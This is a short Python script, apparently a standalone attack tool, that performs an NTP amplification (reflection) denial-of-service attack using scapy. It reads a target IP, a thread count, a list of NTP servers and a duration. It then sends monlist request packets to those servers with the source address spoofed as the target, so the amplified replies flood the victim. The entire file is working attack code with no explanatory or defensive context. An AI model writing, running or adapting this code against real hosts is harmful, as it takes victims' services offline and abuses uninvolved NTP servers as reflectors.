import time
import random
import threading
from scapy.all import *

ip = raw_input("Target: ")
threads = input("Threads: ")
open_list = raw_input("List: ")
timer = float(input("Time(S): "))

with open(open_list, "r") as fd:
	lines = fd.readlines()

payload = "\x17\x00\x03\x2a\x00\x00\x00\x00"

i = 0
ntp_list = []

for line in lines:
	ntp_list.append(line.rstrip("\n"))

if int(threads) > int(len(ntp_list)):
	print("")
	print("Current Threads: %s" % threads)
	print("Max Threads: %s" % len(ntp_list))
	print("Quitting...")
	quit()

timeout = time.time() + 1 * timer

def ntpflood():
	try:
		def ntpflooder():
			global i
			while time.time() < timeout:
				port = random.randint(1, 65535)
				packet = IP(src=ip, dst=ntp_list[i])/UDP(sport=port, dport=123)/Raw(load=payload)
				i += 1
				send(packet, verbose=0)

		for i in range(1):
			thread = threading.Thread(target=ntpflooder)
			thread.start()
	except:
		pass

for i in range(int(threads)):
	thread = threading.Thread(target=ntpflood)
	thread.start()
